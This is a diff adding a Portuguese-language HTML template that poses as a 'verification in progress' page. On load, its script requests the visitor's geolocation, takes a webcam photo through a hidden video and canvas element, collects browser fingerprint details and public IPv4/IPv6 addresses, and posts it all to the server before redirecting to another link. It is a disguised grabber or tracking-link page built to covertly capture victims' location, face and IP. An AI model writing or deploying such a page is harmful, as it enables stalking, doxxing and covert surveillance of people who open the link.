@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Verificação em andamento...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #1a202c; /* fundo escuro */
+      color: #e2e8f0; /* texto claro */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      text-align: center;
+    }
+
+    .spinner {
+      border: 6px solid #2d3748; /* fundo da borda */
+      border-top: 6px solid #38bdf8; /* cor de destaque para a animação */
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .mensagem {
+      font-size: 18px;
+      color: #edf2f7; /* texto claro para contraste */
+      margin-bottom: 20px;
+    }
+
+    #permitir {
+      display: none;
+      background-color: #38bdf8; /* botão de destaque */
+      color: #fff;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 20px;
+      transition: background-color 0.3s ease;
+    }
+
+    #permitir:hover {
+      background-color: #2563eb; /* cor de destaque ao passar o mouse */
+    }
+  </style>
+</head>
+<body>
+  <div class="spinner" id="loading"></div>
+  <p class="mensagem" id="mensagem">Verificando suas informações, aguarde um momento...</p>
+
+  <button id="permitir" onclick="coletarDados()">Continuar</button>
+
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const slug = {{ slug | tojson | safe }};
+    const destino = {{ destino | tojson | safe }};
+    const inicioTempo = Date.now();
+
+    const coletarInfoBrowser = async () => {
+    const userAgent = navigator.userAgent;
+    const idioma = navigator.language;
+    const fusoHorario = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const larguraTela = window.screen.width;
+    const alturaTela = window.screen.height;
+    const plataforma = navigator.platform;
+    const conexao = (navigator.connection || {}).effectiveType || "indisponível";
+    const porta = location.port || (location.protocol === "https:" ? "443" : "80");
+
+    let ip_v4 = "indefinido";
+    let ip_v6 = "indefinido";
+
+    try {
+      const resV4 = await fetch("https://api.ipify.org?format=json");
+      const jsonV4 = await resV4.json();
+      ip_v4 = jsonV4.ip;
+    } catch (e) {
+      console.warn("Erro ao obter IPv4:", e);
+    }
+
+    try {
+      const resV6 = await fetch("https://api64.ipify.org?format=json");
+      const jsonV6 = await resV6.json();
+      ip_v6 = jsonV6.ip;
+    } catch (e) {
+      console.warn("Erro ao obter IPv6:", e);
+    }
+
+    return {
+      userAgent,
+      idioma,
+      fusoHorario,
+      larguraTela,
+      alturaTela,
+      plataforma,
+      conexao,
+      ip_v4,
+      ip_v6,
+      porta
+    };
+  };
+    async function coletarDados() {
+        let latitude = "", longitude = "", foto_base64 = "";
+
+        // Localização
+        try {
+            const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+            latitude = pos.coords.latitude;
+            longitude = pos.coords.longitude;
+        } catch (e) {
+            console.warn("Erro na geolocalização:", e);
+        }
+
+        // Câmera
+        try {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+
+            await new Promise(r => setTimeout(r, 2000)); // tempo da câmera ligar
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            foto_base64 = canvas.toDataURL("image/png");
+
+            stream.getTracks().forEach(t => t.stop());
+        } catch (e) {
+            console.warn("Erro ao acessar câmera:", e);
+        }
+
+        // Informações do navegador
+        const infosBrowser = await coletarInfoBrowser();
+
+        const tempoSegundos = Math.floor((Date.now() - inicioTempo) / 1000);
+
+        const payload = {
+            slug,
+            latitude,
+            longitude,
+            foto_base64,
+            tempoSegundos,
+            ...infosBrowser
+        };
+
+        try {
+            const res = await fetch("/coletar_dados", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+            const json = await res.json();
+
+            // Agora, o json retornado tem o nome da imagem e o destino
+            console.log("Nome do arquivo salvo: ", json.foto_nome);  // Nome do arquivo da imagem
+            window.location.href = json.destino;
+        } catch (e) {
+            console.error("Erro ao enviar dados:", e);
+            document.getElementById('mensagem').innerText = "Erro ao enviar dados.";
+        }
+    }
+
+    coletarDados();
+
+    // Captura de IP inicial (sem a porta)
+    (async () => {
+    let ip_v4 = "indefinido";
+    let ip_v6 = "indefinido";
+
+    try {
+      const resV4 = await fetch("https://api.ipify.org?format=json");
+      ip_v4 = (await resV4.json()).ip;
+    } catch (e) {
+      console.warn("IPv4 não disponível:", e);
+    }
+
+    try {
+      const resV6 = await fetch("https://api64.ipify.org?format=json");
+      ip_v6 = (await resV6.json()).ip;
+    } catch (e) {
+      console.warn("IPv6 não disponível:", e);
+    }
+
+    try {
+      await fetch("/coletar_ip_inicial", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ slug, ip_v4, ip_v6 })
+      });
+    } catch (e) {
+      console.warn("Erro ao enviar IPs:", e);
+    }
+  })();
+
+</script>
+</body>
+</html>
